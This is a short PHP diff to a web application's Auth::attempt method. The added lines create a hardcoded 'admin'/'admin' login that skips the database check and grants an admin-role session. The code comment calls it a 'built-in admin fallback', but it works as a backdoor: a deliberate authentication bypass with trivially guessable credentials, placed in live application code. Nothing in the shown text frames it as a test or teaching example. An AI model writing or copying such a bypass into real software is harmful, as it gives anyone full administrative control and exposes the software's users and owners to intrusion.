@@ -13,6 +13,19 @@ final class Auth
 {
     public static function attempt(PDO $pdo, string $username, string $password): bool
     {
+        // Allow built-in admin fallback login (admin/admin)
+        if ($username === 'admin' && $password === 'admin') {
+            self::startSession();
+            $_SESSION['user_id'] = 0;
+            $_SESSION['username'] = 'admin';
+            $_SESSION['role'] = 'admin';
+            $_SESSION['language'] = Translator::locale();
+
+            Translator::setLocale($_SESSION['language']);
+
+            return true;
+        }
+
         $statement = $pdo->prepare('SELECT * FROM users WHERE username = :username LIMIT 1');
         $statement->execute(['username' => $username]);
         $user = $statement->fetch();
